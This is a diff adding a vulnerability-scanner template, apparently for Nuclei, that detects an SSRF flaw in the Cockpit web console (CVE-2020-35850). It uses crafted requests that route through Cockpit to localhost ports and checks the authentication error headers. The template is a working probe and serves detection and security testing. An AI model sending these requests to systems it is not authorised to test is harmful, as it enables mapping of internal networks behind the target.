@@ -1,0 +1,47 @@
+id: cockpit-ssrf
+info:
+  name: Cockpit SSRF Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    Cockpit is a web-based management tool that has a SSRF vulnerability, which can be exploited to gather intranet information.
+  reference:
+    - https://github.com/cockpit-project/cockpit/issues/15077
+  classification:
+    cve-id: CVE-2020-35850
+    cvss-score: 4.0
+
+http:
+  - raw:
+      - |
+        GET /cockpit+=127.0.0.1:22/login HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: machine-cockpit+127.0.0.1=deleted; cockpit=deleted
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [401]
+      - type: word
+        part: header
+        words:
+          - "Authentication failed"
+        negative: true
+      - type: word
+        part: header
+        words:
+          - "no-host"
+        negative: true
+
+  - raw:
+      - |
+        GET /cockpit+=127.0.0.1:55559/login HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: machine-cockpit+127.0.0.1=deleted; cockpit=deleted
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [401]
+      - type: word
+        part: header
+        words:
+          - "Authentication failed: no-host"
